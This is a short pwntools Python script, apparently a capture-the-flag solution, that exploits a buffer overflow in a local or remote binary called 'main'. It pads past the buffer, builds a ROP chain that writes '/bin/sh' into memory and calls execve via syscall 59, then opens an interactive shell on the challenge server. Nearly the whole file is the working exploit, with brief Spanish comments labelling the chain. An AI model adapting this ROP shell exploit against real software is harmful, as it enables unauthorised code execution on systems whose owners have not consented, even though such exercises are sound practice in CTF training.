#!/usr/bin/env python3

from pwn import *

HOST = "chal.78727867.xyz"
PORT = 34000

exe = ELF("./main")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'warn'

gdb_script = '''
b main
b *0x00000000004297c3
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote(HOST, PORT)
    return r

def main():
    r = conn()

    offset = 24
    mov_qword_ptr_rdi_rax = 0x000000000043f04b
    pop_rax = 0x00000000004297c3
    pop_rsi_pop_rbp = 0x0000000000403d5a
    syscall = 0x00000000004025ea

    payload = flat(
        b'A' * 31, b'\x00', b'B' * offset, # JUNK
        pop_rax, b'/bin/sh\x00', mov_qword_ptr_rdi_rax, # RDI apunta a /bin/sh
        pop_rsi_pop_rbp, 0, 0, # RSI & RBP = 0
        pop_rax, 0x3b, # RAX = 59
        syscall
    )

    r.sendlineafter('name?', payload)
    r.interactive()

if __name__ == "__main__":
    main()

